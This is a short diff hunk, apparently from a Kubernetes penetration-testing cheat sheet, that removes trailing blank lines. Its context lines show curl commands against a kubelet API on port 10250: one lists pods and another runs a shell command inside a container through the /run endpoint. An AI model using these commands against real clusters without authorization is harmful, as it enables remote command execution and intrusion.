@@ -96,8 +96,3 @@ curl -s --insecure https://10.0.0.211:10250/pods | jq '.items[] | .spec.containe
 
 # Run Commands on Pod/Container
 curl --insecure https://10.0.0.211:10250/run/<NAMESPACE>/<POD>/<CONTAINER> -d "cmd=ls -l /etc/ssl/certs"
-
-
-
-
-
